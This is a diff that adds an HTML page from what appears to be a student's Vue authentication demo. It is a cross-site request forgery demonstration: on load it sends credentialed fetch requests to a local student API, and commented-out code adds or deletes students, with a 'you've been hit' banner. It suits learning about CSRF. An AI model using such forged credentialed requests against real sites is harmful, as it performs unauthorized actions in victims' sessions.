@@ -1,0 +1,73 @@
+<!--
+ * @Author: strongest-qiang 1309148358@qq.com
+ * @Date: 2023-08-13 15:58:29
+ * @LastEditors: strongest-qiang 1309148358@qq.com
+ * @LastEditTime: 2023-08-13 16:33:16
+ * @FilePath: \Front-end\Vue\Vue3\demo\认证\backage\src\views\origin_router.html
+ * @Description: 这是默认设置,请设置`customMade`, 打开koroFileHeader查看配置 进行设置: https://github.com/OBKoro1/koro1FileHeader/wiki/%E9%85%8D%E7%BD%AE
+-->
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+
+  <body>
+    <!-- <h1>你中招了,我把你的学生删除了</h1> -->
+    <h1>你中招了,我随意加入了学生</h1>
+    <script>
+      document.addEventListener("DOMContentLoaded", async () => {
+        const response = await fetch("/api/stu", {
+          credentials: "include",
+          method: "GET",
+          mode: "cors",
+        });
+        const text = await response.json();
+      });
+
+      //         document.addEventListener("DOMContentLoaded", async () => {
+      //     await fetch("http://127.0.0.1:80/api/add", {
+      //         headers: {
+      //             'Content-Type': 'application/json'
+      //         },
+      //         method: 'POST',
+      //         body: JSON.stringify({
+      //             class: "4班",
+      //             username: "坏人"
+      //         })
+      //     });
+      // })
+      // document.addEventListener("DOMContentLoaded", async () => {
+      //     await fetch("http://127.0.0.1:80/api/id/?id=13", {
+      //         credentials: "include",
+      //         method: "POST",
+      //         mode: 'cors'
+      //     });
+      // })
+    </script>
+  </body>
+  <style>
+    table {
+      width: 100%;
+      border: 1px solid #ccc;
+      border-collapse: collapse;
+    }
+
+    thead th {
+      width: 25%;
+      height: 100px;
+      border: 1px solid #ccc;
+    }
+
+    td {
+      width: auto;
+      height: 100px;
+      text-align: center;
+      border: 1px solid #ccc;
+      /* padding: 20px; */
+    }
+  </style>
+</html>
